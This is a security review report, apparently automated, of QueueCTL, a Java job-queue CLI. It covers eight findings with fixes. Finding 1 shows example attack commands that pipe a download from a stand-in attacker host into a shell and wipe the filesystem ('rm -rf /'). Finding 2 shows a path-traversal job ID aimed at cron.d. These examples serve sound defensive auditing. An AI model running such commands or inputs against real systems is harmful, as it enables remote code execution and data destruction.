# Security Review: QueueCTL

**Date:** 2026-02-12
**Scope:** Full codebase review of the QueueCTL CLI-based job queue system
**Reviewer:** Automated Security Review

---

## Executive Summary

QueueCTL is a CLI-based job queue system that enqueues, processes, and retries shell commands using file-based persistence. The review identified **3 critical/high-severity** vulnerabilities and **5 medium/low-severity** issues. The most severe finding is an **arbitrary command execution** vulnerability that is inherent to the application's design, combined with a **path traversal** vulnerability in job ID handling.

---

## Findings

### 1. [CRITICAL] Arbitrary Shell Command Execution

**File:** `src/main/java/com/queuectl/worker/WorkerRunnable.java:86-109`
**CWE:** CWE-78 (OS Command Injection)

**Description:**
The `executeCommand` method passes user-supplied job commands directly to a system shell without any validation, sanitization, or sandboxing:

```java
if (System.getProperty("os.name").toLowerCase().contains("win")) {
    pb.command("cmd", "/c", command);
} else {
    pb.command("sh", "-c", command);
}
```

Any user who can enqueue a job can execute arbitrary commands with the privileges of the worker process:

```
queuectl enqueue '{"command":"curl attacker.com/malware | sh"}'
queuectl enqueue '{"command":"rm -rf /"}'
```

**Impact:** Full system compromise. An attacker with access to the CLI or the data directory can execute arbitrary code.

**Recommendation:**
- Implement a command allowlist or restrict commands to a predefined set of safe executables.
- Consider running commands in a sandboxed environment (e.g., containers, seccomp profiles, or restricted shells).
- At minimum, validate commands against a pattern and reject shell metacharacters like `;`, `|`, `&`, `` ` ``, `$()`, etc.

---

### 2. [HIGH] Path Traversal via Job ID

**File:** `src/main/java/com/queuectl/repository/JobRepository.java:28,38`
**CWE:** CWE-22 (Path Traversal)

**Description:**
Job IDs are used directly in file path construction without sanitization:

```java
File jobFile = new File(jobsDir, "job-" + job.getId() + ".json");
```

A malicious job ID such as `../../etc/cron.d/backdoor` would resolve to a path outside the intended `jobs/` directory. Java's `File(parent, child)` constructor does **not** prevent directory traversal when the child contains `../` sequences.

This affects:
- `save()` (line 28) — write arbitrary files
- `findById()` (line 38) — read arbitrary `.json` files
- `acquireLock()` (line 95) — create `.lock` files at arbitrary paths
- `releaseLock()` (line 108) — delete `.lock` files at arbitrary paths

**Impact:** Arbitrary file write/read on the filesystem within the process's permissions. An attacker could overwrite configuration files or plant files in sensitive directories.

**Recommendation:**
- Validate job IDs against a strict pattern (e.g., `^[a-zA-Z0-9_-]+$`).
- Resolve the canonical path and verify it remains within the expected `jobsDir` directory.
- Example fix:
  ```java
  if (!id.matches("^[a-zA-Z0-9_-]+$")) {
      throw new IllegalArgumentException("Invalid job ID: " + id);
  }
  ```

---

### 3. [HIGH] Race Conditions in File-Based Locking (TOCTOU)

**File:** `src/main/java/com/queuectl/worker/WorkerRunnable.java:45-56`, `src/main/java/com/queuectl/repository/JobRepository.java:94-110`
**CWE:** CWE-367 (Time-of-check Time-of-use)

**Description:**
Multiple race conditions exist in the job processing pipeline:

1. **Stale job state after lock acquisition:** `findPendingJobsReadyForExecution()` reads jobs, but by the time `acquireLock()` succeeds, another worker may have already changed the job's state. The worker then calls `processJob()` with the stale `Job` object — it does not re-read the job from disk after acquiring the lock.

   ```java
   List<Job> pendingJobs = jobRepository.findPendingJobsReadyForExecution();
   for (Job job : pendingJobs) {
       if (jobRepository.acquireLock(job.getId())) {
           processJob(job);  // Uses stale Job object, does not re-read from disk
       }
   }
   ```

2. **No stale lock detection:** If a worker crashes while holding a lock, the `.lock` file persists indefinitely. No mechanism exists to detect or clean up stale locks, causing the job to be permanently stuck.

3. **Non-atomic file updates:** `save()` writes directly to the target file. A crash mid-write corrupts the job file with no recovery mechanism.

**Impact:** Duplicate job execution, permanently stuck jobs after worker crashes, and potential data corruption.

**Recommendation:**
- Re-read the job state from disk after acquiring the lock and verify it's still PENDING before processing.
- Add a timestamp or PID-based staleness check for lock files (e.g., expire locks older than 10 minutes).
- Use atomic file writes (write to a temp file, then rename).

---

### 4. [MEDIUM] Unbounded Worker Count — Resource Exhaustion

**File:** `src/main/java/com/queuectl/CLI.java:98`, `src/main/java/com/queuectl/service/WorkerService.java:19`
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:**
The `--count` parameter for `worker start` accepts any positive integer with no upper bound. A user could run:

```
queuectl worker start --count 100000
```

This spawns 100,000 child JVM processes, exhausting system memory, file descriptors, and CPU — effectively a local denial of service.

**Impact:** System-level denial of service through resource exhaustion.

**Recommendation:**
- Set a reasonable maximum worker count (e.g., 2x CPU cores).
- Validate the count parameter: `if (count < 1 || count > MAX_WORKERS)`.

---

### 5. [MEDIUM] Shared Data Directory Without Access Controls

**File:** `src/main/java/com/queuectl/CLI.java:18`
**CWE:** CWE-732 (Incorrect Permission Assignment)

**Description:**
The data directory `./queuectl-data` is created with default filesystem permissions. On multi-user systems, any user with access to the working directory can:

- Read all job definitions (including commands and their states)
- Modify existing job files to change the command that will be executed
- Create new job files that workers will pick up and execute
- Delete lock files to cause duplicate processing

**Impact:** Privilege escalation if workers run as a different (more privileged) user, or data tampering by co-located users.

**Recommendation:**
- Set restrictive permissions on the data directory (e.g., `700`).
- Consider per-user data directories or adding integrity checks (e.g., HMAC signatures on job files).

---

### 6. [MEDIUM] Missing Input Validation on Configuration Values

**File:** `src/main/java/com/queuectl/CLI.java:219-236`
**CWE:** CWE-20 (Improper Input Validation)

**Description:**
While basic range checks exist (`maxRetries > 0`, `backoffBase > 1`), there are no upper bounds. Extreme values can cause issues:

- `max-retries = 2147483647` — a job would retry billions of times before going to DLQ.
- `backoff-base = 1000000` with multiple attempts — `Math.pow(1000000, 10)` overflows, and casting `Double.POSITIVE_INFINITY` to `long` yields `Long.MAX_VALUE`, effectively making `nextRetryAt` in the far future.

**Impact:** Jobs stuck in infinite retry loops or permanently deferred.

**Recommendation:**
- Set reasonable upper bounds (e.g., `max-retries <= 100`, `backoff-base <= 60`).
- Cap the calculated backoff delay to a maximum value (e.g., 1 hour).

---

### 7. [LOW] Non-Atomic File Writes Risk Data Corruption

**File:** `src/main/java/com/queuectl/repository/JobRepository.java:27-35`, `src/main/java/com/queuectl/repository/ConfigRepository.java:33-40`
**CWE:** CWE-367 (TOCTOU Race Condition)

**Description:**
Both repositories write directly to the target file via Jackson's `writeValue()`. If the JVM crashes or is killed (e.g., `kill -9`) during a write, the JSON file may be left partially written and thus unreadable, causing the job to be permanently lost.

**Impact:** Data loss on abnormal process termination.

**Recommendation:**
- Write to a temporary file in the same directory, then atomically rename via `Files.move(temp, target, StandardCopyOption.ATOMIC_MOVE)`.

---

### 8. [LOW] Process Output Not Captured

**File:** `src/main/java/com/queuectl/worker/WorkerRunnable.java:86-109`
**CWE:** CWE-778 (Insufficient Logging)

**Description:**
When executing job commands, `stdout` and `stderr` of the child process are not captured or logged. This means:

- Failed jobs provide no diagnostic information about *why* they failed.
- Malicious commands could exfiltrate data via stdout/stderr to inherited file descriptors without any audit trail.

**Impact:** Inability to diagnose failures; reduced forensic capability.

**Recommendation:**
- Capture and store stdout/stderr output (truncated to a reasonable size) in the Job object or a separate log file.

---

## Dependency Analysis

| Dependency | Version | Status |
|---|---|---|
| Jackson Databind | 2.15.2 | Released June 2023. Consider upgrading to latest 2.17.x to incorporate security patches. Jackson versions prior to 2.15.3 have known advisories. |
| Jackson JSR310 | 2.15.2 | Same as above — keep in sync with jackson-databind. |
| JUnit Jupiter | 5.10.0 | Test-only dependency. No production risk. |

**Recommendation:** Upgrade Jackson dependencies to the latest stable release (currently 2.17.x) to address any known CVEs in the 2.15.x line.

---

## Summary Table

| # | Severity | Title | File(s) |
|---|---|---|---|
| 1 | **CRITICAL** | Arbitrary Shell Command Execution | `WorkerRunnable.java:86-109` |
| 2 | **HIGH** | Path Traversal via Job ID | `JobRepository.java:28,38,95,108` |
| 3 | **HIGH** | Race Conditions in File-Based Locking (TOCTOU) | `WorkerRunnable.java:45-56`, `JobRepository.java:94-110` |
| 4 | **MEDIUM** | Unbounded Worker Count | `CLI.java:98`, `WorkerService.java:19` |
| 5 | **MEDIUM** | Shared Data Directory Without Access Controls | `CLI.java:18` |
| 6 | **MEDIUM** | Missing Upper Bounds on Configuration Values | `CLI.java:219-236` |
| 7 | **LOW** | Non-Atomic File Writes | `JobRepository.java:27-35`, `ConfigRepository.java:33-40` |
| 8 | **LOW** | Process Output Not Captured | `WorkerRunnable.java:86-109` |

---

## Prioritized Remediation Plan

1. **Immediate:** Validate and sanitize job IDs (Finding #2) — straightforward fix that prevents file system attacks.
2. **Immediate:** Re-read job state after lock acquisition (Finding #3) — prevents duplicate execution.
3. **Short-term:** Implement command validation/sandboxing (Finding #1) — design decision required on allowlist vs. sandbox approach.
4. **Short-term:** Cap worker count and configuration values (Findings #4, #6).
5. **Medium-term:** Implement atomic file writes and stale lock detection (Findings #3, #7).
6. **Medium-term:** Restrict data directory permissions and capture process output (Findings #5, #8).
7. **Ongoing:** Keep dependencies up to date (Jackson upgrade).
